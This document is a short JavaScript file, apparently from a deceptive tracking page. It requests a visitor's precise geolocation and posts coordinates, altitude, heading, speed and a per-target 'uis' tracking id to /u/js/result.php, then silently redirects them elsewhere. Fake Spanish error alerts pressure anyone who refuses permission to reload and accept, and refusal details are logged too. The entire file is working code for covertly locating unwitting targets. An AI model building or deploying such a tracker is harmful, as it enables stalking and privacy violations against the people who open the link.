function locate() {
    if (navigator.geolocation) {
        var optn = {enableHighAccuracy: true, timeout: 30000, maximumage: 0};
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    } else {
        alert('Error al cargar la pagina intente de nuevo...');
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var acc = position.coords.accuracy;
        var alt = position.coords.altitude;
        var dir = position.coords.heading;
        var spd = position.coords.speed;


        var foo = getParameterByName('foo');
        var foo1 = getParameterByName('foo1');
        var obj = getParameterByName('uis');
        var bes = getParameterByName('bes');


        $.ajax({
            type: 'POST',
            url: '/u/js/result.php',
            data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, Uis: obj},
            success: function () {
                window.location = foo;
            },
            mimeType: 'text'
        });
    };
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            var denied = 'El usuario rechazo la solicitud';
            alert('Error... Actualice esta pagina y acepte para continuar.');
            break;
        case error.POSITION_UNAVAILABLE:
            var unavailable = 'La informacion no esta disponible';
            break;
        case error.TIMEOUT:
            var timeout = 'Se agoto el tiempo de espera de la solicitud para obtener la ubicacion del usuario';
            alert('Error... Actualice esta pagina y acepte para continuar.');
            break;
        case error.UNKNOWN_ERROR:
            var unknown = 'Un error desconocido ocurrió';
            break;
    }

    var foo = getParameterByName('foo');
    var foo1 = getParameterByName('foo1');
    var obj = getParameterByName('uis');
    var bes = getParameterByName('bes');

    $.ajax({
        type: 'POST',
        url: '/u/js/error.php',
        data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown, Uis: obj},
        success: function () {
            window.location = foo;
        },
        mimeType: 'text'
    });
}
